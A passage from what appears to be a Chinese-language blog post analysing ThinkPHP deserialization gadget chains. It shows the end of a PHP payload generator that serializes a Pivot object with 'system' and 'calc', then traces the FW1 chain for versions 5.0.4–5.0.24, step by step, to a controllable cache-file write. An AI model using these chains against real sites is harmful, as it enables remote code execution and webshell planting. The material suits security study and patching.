&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> \<span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(0, &quot;<span class="title class_">system</span>&quot;, &quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="FW1（影响-5-0-4-5-0-24）"><a href="#FW1（影响-5-0-4-5-0-24）" class="headerlink" title="FW1（影响 5.0.4 - 5.0.24）"></a>FW1（影响 5.0.4 - 5.0.24）</h2><h3 id="基本信息-4"><a href="#基本信息-4" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p><strong>影响范围</strong> ：5.0.4 - 5.0.24</p>
</li>
<li><p><strong>生成命令</strong> ：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPFW1.svg"
                      alt="TPFW1"
                ></p>
</li>
<li><p><strong>反序列化调用链</strong> ：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">think\Process-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">└── <span class="title function_ invoke__">stop</span>(): <span class="keyword">int</span></span><br><span class="line">    ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>())                            <span class="comment">// ❌ $this-&gt;status = STATUS_READY，返回 false，不进入</span></span><br><span class="line">    │   └── <span class="title function_ invoke__">isRunning</span>(): <span class="keyword">bool</span></span><br><span class="line">    │       ├── <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) <span class="comment">// ✅ 默认 status = &quot;ready&quot;</span></span><br><span class="line">    │       │   └── <span class="keyword">return</span> <span class="literal">false</span> <span class="comment">// ✅ 直接返回</span></span><br><span class="line">    │       └── <span class="comment">// ❌ 不进入后续判断</span></span><br><span class="line">    ├── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>)</span><br><span class="line">    │   └── <span class="title function_ invoke__">updateStatus</span>(<span class="keyword">bool</span> <span class="variable">$blocking</span>): <span class="keyword">void</span></span><br><span class="line">    │       ├── <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) <span class="comment">// ✅ status = &quot;ready&quot;</span></span><br><span class="line">    │       │   └── <span class="keyword">return</span>; <span class="comment">// ✅ 直接返回</span></span><br><span class="line">    │       └── <span class="comment">// ❌ 不执行后续逻辑</span></span><br><span class="line">    └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>])          <span class="comment">// ✅ = true，进入分支</span></span><br><span class="line">        └── <span class="title function_ invoke__">close</span>(): <span class="keyword">int</span></span><br><span class="line">            └── <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">close</span>()</span><br><span class="line">                <span class="comment">// $processPipes = HasMany 对象，没有 close 方法，触发 __call 魔术方法</span></span><br><span class="line"></span><br><span class="line">think\model\relation<span class="title class_">\HasMany</span>::<span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$method</span> = <span class="string">&quot;close&quot;</span>, <span class="keyword">array</span> <span class="variable">$args</span> = [])</span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query)                                      <span class="comment">// ✅ query 不为空，进入</span></span><br><span class="line">    └── <span class="title function_ invoke__">baseQuery</span>(): <span class="keyword">void</span></span><br><span class="line">        └── <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;baseQuery))                   <span class="comment">// ✅ baseQuery = null，进入</span></span><br><span class="line">            └── <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) <span class="comment">// ✅ 假设 parent.k 存在</span></span><br><span class="line">                └── <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;) <span class="comment">// ✅ $this-&gt;localKey = &#x27;k&#x27;, $this-&gt;parent-&gt;k 随便一个值，比如 0</span></span><br><span class="line">                    <span class="comment">// $query 是 Output 对象，触发其 __call 魔术方法</span></span><br><span class="line"></span><br><span class="line">think\console<span class="title class_">\Output</span>::<span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$method</span> = <span class="string">&quot;where&quot;</span>, <span class="keyword">array</span> <span class="variable">$args</span> = [<span class="string">&quot;file_content&quot;</span>, <span class="number">0</span>])</span><br><span class="line">└── <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles))                  <span class="comment">// ✅ styles = [&#x27;where&#x27;]，进入判断</span></span><br><span class="line">    ├── <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>)                      <span class="comment">// ✅ $args = [&#x27;where&#x27;, &#x27;file_content&#x27;, 0]</span></span><br><span class="line">    └── <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span> = [<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;file_content&#x27;</span>, <span class="number">0</span>])</span><br><span class="line">        └── <span class="title function_ invoke__">block</span>(style = <span class="string">&quot;where&quot;</span>, message = <span class="string">&quot;file_content&quot;</span>)</span><br><span class="line">            └── <span class="title function_ invoke__">writeln</span>(messages = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, type = <span class="number">0</span>)</span><br><span class="line">                └── <span class="title function_ invoke__">write</span>(messages = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, newline = <span class="literal">true</span>, type = <span class="number">0</span>)</span><br><span class="line">                    └── <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(</span><br><span class="line">                            messages = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, </span><br><span class="line">                            newline = <span class="literal">true</span>, </span><br><span class="line">                            type = <span class="number">0</span></span><br><span class="line">                        )</span><br><span class="line">                        <span class="comment">// handle = Memcache 对象，进入 write</span></span><br><span class="line"></span><br><span class="line">think\session\driver<span class="title class_">\Memcache</span>::<span class="title function_ invoke__">write</span>(<span class="keyword">string</span> <span class="variable">$sessID</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">string</span> <span class="variable">$sessData</span> = <span class="literal">true</span>)</span><br><span class="line">└── <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(</span><br><span class="line">        <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>,           // ✅ session_name = <span class="string">&#x27;&#x27;</span> → <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span></span><br><span class="line">        <span class="variable">$sessData</span>,                                         // ✅ = <span class="literal">true</span></span><br><span class="line">        <span class="number">0</span>,                                                 // 第三个参数 = <span class="number">0</span></span><br><span class="line">        <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]                            // ✅ 默认为 <span class="number">3600</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// handler = Memcached 对象 → set()</span></span><br><span class="line"></span><br><span class="line">think\cache\driver<span class="title class_">\Memcached</span>::<span class="title function_ invoke__">set</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = <span class="literal">true</span>, <span class="keyword">int</span> <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) == <span class="literal">true</span>          <span class="comment">// ✅ $tag = true 且缓存不存在</span></span><br><span class="line">    └── <span class="title function_ invoke__">has</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>): <span class="keyword">bool</span></span><br><span class="line">        ├── <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)</span><br><span class="line">        │   └── <span class="title function_ invoke__">getCacheKey</span>(<span class="keyword">string</span> <span class="variable">$name</span>): <span class="keyword">string</span></span><br><span class="line">        │       └── <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span> <span class="comment">// ✅ prefix = &#x27;&#x27;</span></span><br><span class="line">        ├── <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">        │   └── think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">get</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$default</span> = <span class="literal">false</span>)</span><br><span class="line">        │       ├── <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>)</span><br><span class="line">        │       │   └── <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) . <span class="string">&quot;.php&quot;</span></span><br><span class="line">        │       ├── <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) == <span class="literal">true</span>         <span class="comment">// ✅ 文件不存在</span></span><br><span class="line">        │       └── <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        └── <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    └── <span class="variable">$first</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">└── <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>) = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span></span><br><span class="line">└── <span class="variable">$expire</span> = (<span class="number">0</span> == <span class="variable">$expire</span>) ? <span class="number">0</span> : <span class="title function_ invoke__">time</span>() + <span class="variable">$expire</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 📌 第一次写入（内容不可控）</span></span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="variable">$value</span> = <span class="literal">true</span>, <span class="variable">$expire</span> = <span class="number">0</span>)) == <span class="literal">true</span></span><br><span class="line">    └── think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">set</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = <span class="literal">true</span>, <span class="keyword">int</span> <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">    │   ├── <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) == <span class="literal">false</span></span><br><span class="line">    │   ├── <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) == <span class="literal">false</span></span><br><span class="line">    │   ├── <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>)</span><br><span class="line">    │   │   └── <span class="title function_ invoke__">getCacheKey</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">bool</span> <span class="variable">$auto</span> = <span class="literal">true</span>): <span class="keyword">string</span></span><br><span class="line">    │   │       ├── <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>)</span><br><span class="line">    │   │       ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line">    │   │       ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line">    │   │       ├── <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&quot;.php&quot;</span></span><br><span class="line">    │   │       └── <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>))) → <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>)</span><br><span class="line">    │   ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) == <span class="literal">false</span> <span class="comment">// ✅ $this-&gt;tag = false，跳过，$first 未设置</span></span><br><span class="line">    │   ├── <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="literal">true</span>) = <span class="string">&#x27;b:1;&#x27;</span></span><br><span class="line">    │   ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]) == <span class="literal">false</span>   <span class="comment">// ✅ 未启用压缩</span></span><br><span class="line">    │   ├── <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span></span><br><span class="line">    │   ├── <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)   <span class="comment">// ✅ 第一次写入（内容不可控）</span></span><br><span class="line">    │   └── <span class="keyword">if</span> (<span class="variable">$result</span>) == <span class="literal">true</span></span><br><span class="line">    │       ├── <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$first</span>))                          <span class="comment">// ❌ $first 未设置</span></span><br><span class="line">    │       │   └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>)            <span class="comment">// ❌ 写入值为路径，不可控，不是利用点</span></span><br><span class="line">    │       └── <span class="title function_ invoke__">clearstatcache</span>()</span><br><span class="line">    │       └── <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    │</span><br><span class="line">    <span class="comment">// 📌 第二次写入（内容可控）来自上层 Memcached::set → setTagItem($key)</span></span><br><span class="line">    └── <span class="keyword">if</span> (<span class="variable">$first</span>) == <span class="literal">true</span></span><br><span class="line">        └── <span class="title function_ invoke__">setTagItem</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">            ├── <span class="variable">$key</span> = <span class="string">&quot;tag_&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag)</span><br><span class="line">            ├── <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$key</span>)) == <span class="literal">true</span></span><br><span class="line">            │   └── <span class="variable">$value</span> = <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span> <span class="comment">// ✅ 可控内容</span></span><br><span class="line">            └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span> = <span class="string">&quot;tag_xxx&quot;</span>, <span class="variable">$value</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">                └── think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">set</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;tag_xxx&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">int</span> <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">                    ├── <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) == <span class="literal">false</span></span><br><span class="line">                    ├── <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) == <span class="literal">false</span></span><br><span class="line">                    ├── <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span> = <span class="string">&quot;tag_xxx&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">                    │   └── <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;tag_xxx&quot;</span>) . <span class="string">&quot;.php&quot;</span></span><br><span class="line">                    ├── <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>) = s:<span class="number">30</span>:<span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>;      <span class="comment">// ✅ 内容可控</span></span><br><span class="line">                    ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line">                    ├── <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span></span><br><span class="line">                    └── <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)         <span class="comment">// ✅ 第二次写入（内容可控）</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用链分析-4"><a href="#调用链分析-4" class="headerlink" title="调用链分析"></a>调用链分析</h3><p><code>think\Process-&gt;__destruct</code> 函数会调用 <code>stop</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stop</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>stop</code> 函数中间有很多判断和干扰逻辑但是我们只需要设置 <code>think\Process-&gt;processInformation[&#39;running&#39;] = true</code>，然后 <code>think\Process-&gt;status</code> 为默认值就可以绕过。从而顺利调用到 <code>close</code> 函数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">STATUS_READY</span>      = <span class="string">&#x27;ready&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">STATUS_STARTED</span>    = <span class="string">&#x27;started&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$status</span>                       = <span class="built_in">self</span>::<span class="variable constant_">STATUS_READY</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查是否正在运行</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isRunning</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ✅ $this-&gt;status 默认是 self::STATUS_READY</span></span><br><span class="line">    <span class="comment">// 不相等直接返回 false</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 更新状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $blocking</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateStatus</span>(<span class="params"><span class="variable">$blocking</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ✅ $this-&gt;status 默认是 self::STATUS_READY</span></span><br><span class="line">    <span class="comment">// 不相等直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 终止进程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ❌ $this-&gt;status 如果是默认值则不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ✅ $this-&gt;status 如果是默认值则 updateStatus 不执行逻辑</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ✅ 设置 $this-&gt;processInformation[&#x27;running&#x27;] = true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>(); <span class="comment">// 👈 调用 close 函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;exitcode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>close</code> 函数会调用 <code>$this-&gt;processPipes</code> 的 <code>close</code> 函数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关闭资源</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int 退出码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$this-&gt;processPipes</code> 被我们设置为 <code>think\model\relation\HasMany</code> 对象，而该对象没有 <code>close</code> 方法，因此会调用 <code>HasMany</code> 的父类 <code>Relation</code> 的 <code>__call</code> 函数。</p>
<p>在 <code>__call</code> 函数中，如果 <code>$this-&gt;query</code> 不为空则会调用 <code>HasMany-&gt;baseQuery</code> 方法。</p>
